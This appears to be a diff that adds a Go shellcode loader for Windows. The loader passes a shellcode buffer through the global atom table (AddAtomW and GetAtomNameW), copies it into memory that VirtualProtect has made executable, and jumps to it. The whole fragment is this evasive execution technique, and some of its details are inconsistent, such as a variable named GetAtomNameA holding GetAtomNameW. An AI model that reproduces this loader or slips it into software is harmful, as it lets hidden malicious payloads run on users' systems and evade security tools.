@@ -1,0 +1,11 @@
+size := uintptr(len(shellcode))
+targetPtr := func(){}
+var old uint32
+windows.VirtualProtect(uintptr(unsafe.Pointer(&targetPtr)),size,windows.PAGE_EXECUTE_READWRITE,&old)
+
+k32 := syscall.NewLazyDLL("kernel32.dll")
+AddAtomW := k32.NewProc("AddAtomW")
+atom,_,_ := AddAtomW.Call(uintptr(unsafe.Pointer(&shellcode[0])))
+GetAtomNameA := k32.NewProc("GetAtomNameW")
+GetAtomNameA.Call(atom,uintptr(unsafe.Pointer(&targetPtr)),size)
+syscall.Syscall(uintptr(unsafe.Pointer(&targetPtr)), 0, 0, 0, 0)
